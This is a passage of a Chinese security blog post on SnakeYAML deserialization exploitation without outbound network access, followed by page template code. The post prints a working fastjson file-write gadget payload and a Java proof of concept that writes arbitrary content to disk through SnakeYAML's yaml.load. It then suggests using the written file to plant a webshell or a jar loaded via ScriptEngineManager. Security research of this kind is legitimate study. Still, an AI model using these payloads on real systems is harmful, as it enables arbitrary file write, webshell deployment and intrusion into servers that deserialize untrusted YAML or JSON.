+<p>我探寻了一下，类里面套一层类，就被解析为SequenceNode。</p>
+<p>然后是Constructor，像jdbcRowSetImpl利用链就被解析为MappingNode</p>
+<h2 id="不出网的利用"><a href="#不出网的利用" class="headerlink" title="不出网的利用"></a>不出网的利用</h2><p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10655">https://xz.aliyun.com/t/10655</a></p>
+<p>之前看过长亭的fastjson的commons-io写webshell，相当的精彩。</p>
+<p><img src="/../snakeyaml/image-20240112195143936.png" srcset="/img/loading.gif" lazyload alt="image-20240112195143936"></p>
+<p>如图，fastjson是会检查构造函数的，所以fastjson那个链找了6个类，还有循环引用才成功。</p>
+<p>目前公开的jre 8 下写文件poc：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>    <span class="hljs-string">&quot;x&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span>,<br>        <span class="hljs-string">&quot;out&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.util.zip.InflaterOutputStream&quot;</span>,<br>            <span class="hljs-string">&quot;out&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.io.FileOutputStream&quot;</span>,<br>                <span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">&quot;/tmp/dest.txt&quot;</span>,<br>                <span class="hljs-string">&quot;append&quot;</span>:false<br>            &#125;,<br>            <span class="hljs-string">&quot;infl&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;input&quot;</span>:<span class="hljs-string">&quot;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;bufLen&quot;</span>:<span class="hljs-number">1048576</span><br>        &#125;,<br>        <span class="hljs-string">&quot;protocolVersion&quot;</span>:<span class="hljs-number">1</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这个snakeyaml可以用，写了个poc如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.zip.Deflater;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">originalData</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;whoamipriv&quot;</span>;<br>        <span class="hljs-type">byte</span>[] compressedData = compressData(originalData.getBytes());<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(compressedData));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\&quot;c:/users/daniel/desktop/1.txt\&quot;],false],!!java.util.zip.Inflater  &#123; input: !!binary &quot;</span> +  base64 +<span class="hljs-string">&quot; &#125;,1048576]]&quot;</span>;<br><br>        yaml.load(poc);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] compressData(<span class="hljs-type">byte</span>[] data) &#123;<br>        <span class="hljs-type">Deflater</span> <span class="hljs-variable">deflater</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Deflater</span>();<br>        deflater.setInput(data);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>(data.length);<br><br>        deflater.finish();<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">while</span> (!deflater.finished()) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> deflater.deflate(buffer);<br>            outputStream.write(buffer, <span class="hljs-number">0</span>, count);<br>        &#125;<br><br>        deflater.end();<br>        <span class="hljs-keyword">return</span> outputStream.toByteArray();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>hh写完才发现作者最下面给了poc了。</p>
+<p>写完文件后，可以写webshell，写不了可以写个jar包用ScriptEngineManager加载jar。</p>
+<p>完。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/java-codeaudit/" class="print-no-link">#java codeaudit</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>snakeyaml</div>
+      <div>http://example.com/2024/01/12/snakeyaml/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>January 12, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/01/12/JDBCDeserialize/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/12/hibernate/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
